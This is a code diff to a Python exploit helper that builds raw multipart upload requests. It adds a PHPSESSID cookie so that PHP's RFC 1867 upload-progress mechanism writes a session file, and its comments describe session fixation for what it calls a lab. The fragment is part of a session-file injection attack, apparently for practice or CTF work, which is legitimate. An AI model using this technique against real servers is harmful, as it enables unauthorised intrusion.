@@ -36,11 +36,15 @@ def upload(host, port, path, sid, filename):
         f"--{boundary}--\r\n"
     ).encode("latin-1")
 
+    # Cookie is required: rfc1867 alone does not persist a session file
+    # for this lab when the endpoint does not call session_start().
+    # Send both POST-body SID (fixation) and Cookie SID.
     req = (
         f"POST {path} HTTP/1.1\r\n"
         f"Host: {host}\r\n"
         f"Content-Type: multipart/form-data; boundary={boundary}\r\n"
         f"Content-Length: {len(body)}\r\n"
+        f"Cookie: PHPSESSID={sid}\r\n"
         f"Connection: close\r\n\r\n"
     ).encode() + body
 
